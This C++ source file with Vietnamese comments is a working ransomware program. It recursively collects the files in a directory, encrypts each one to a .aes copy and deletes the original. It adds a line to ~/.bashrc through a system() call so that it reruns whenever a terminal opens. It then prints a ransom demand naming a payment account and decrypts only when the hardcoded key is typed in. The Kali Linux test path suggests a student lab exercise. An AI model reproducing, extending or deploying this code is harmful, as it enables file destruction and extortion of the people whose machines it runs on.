#include <iostream>
#include <fstream>
#include <bitset>
#include <string>
#include <vector>
#include <dirent.h>
#include <cstring>
#include "AES.cpp"
using namespace std;
vector <char *> files;
void Encrypt(char *file){
	ifstream in;
	ofstream out;
	string filein = string(file);
	string fileout = filein + ".aes";
	in.open(filein, ios::binary);
	out.open(fileout, ios::binary);
	bitset<64> plain;
	while(in.read((char*)&plain, sizeof(plain)))
	{
		bitset<64> cipher  = encrypt(plain);
		out.write((char*)&cipher, sizeof(cipher));
		plain.reset();  
	}
	//xoa file goc
	remove(file);
	in.close();
	out.close();
}
void Decrypt(char *file){
	ifstream in;
	ofstream out;
	string fileout = string (file);
	string filein = fileout + ".aes";
	in.open(filein, ios::binary);
	out.open(fileout, ios::binary);
	bitset<64> plain;
	while(in.read((char*)&plain, sizeof(plain)))
	{
		bitset<64> temp  = decrypt(plain);
		out.write((char*)&temp, sizeof(temp));
		plain.reset();  
	}
	//xoa file ma hoa sau giai ma
	char * fileaes = (char *) malloc(1024);
	sprintf(fileaes, "%s%s", file, ".aes");	
	remove(fileaes);
	in.close();
	out.close();
}
void dirfolder (char * path){
	DIR *dir;
	struct dirent *diread;
    	if ((dir = opendir(path)) != nullptr) {
        	while ((diread = readdir(dir)) != nullptr) {
			if (diread->d_type == DT_REG){
				char * file = (char *) malloc(1024);
				sprintf(file, "%s/%s", path, diread->d_name);
				files.push_back(file);	//them vao vector files
			}       		     
			else if(diread->d_type==DT_DIR && strcmp(diread->d_name,".")!=0 && strcmp(diread->d_name,"..")!=0){
				char d_path[1024];
				sprintf(d_path, "%s/%s", path, diread->d_name);
				dirfolder(d_path);	//tiep tuc mo folder
			}
        	}
        	closedir (dir);
    	} 
}
void giaima(string k){
	cout << "Nhap code giai ma: ";
	string code;	
	cin >> code; 
	if (k == code){
		for (char * file: files){
			Decrypt(file);
		}
		cout << "Cam on da hop tac :)))\n";	
	}
	else{
		cout << "Sai code"<< endl;
		giaima(k);
	}
}
int main(int argc, char ** argv) {
	string k = "nguyenvanhieu_vcs";	
	key = charToBitset(k.c_str());
	generateKeys();   
	string path_ = "/home/kali/Desktop/test/";
	char * path = (char *) path_.c_str();
	dirfolder(path);	
	if (argc > 1){			// Co argument
		char bashrc[50] = "echo home/hieunv/ransomware >> ~/.bashrc";  // them lenh vao /.bashrc --> moi khi bat terminal moi se hien chay home/hieunv/ransomware
		system(bashrc);	
		for (char * file: files){
			Encrypt(file);
		}
		cout << "Tat ca cac file cua may da bi ma hoa, khon hon thi nop 100tr tien mat vao VTPAY 096853393x :)))))" << endl;
		giaima(k);
	}
	else {				// co argument se chay ham giaima() khi bat terminal moi
		cout << "Tat ca cac file cua may da bi ma hoa, khon hon thi nop 100tr tien mat vao VTPAY 096853393x :)))))" << endl;
		giaima(k);
	}
	return 0;
}
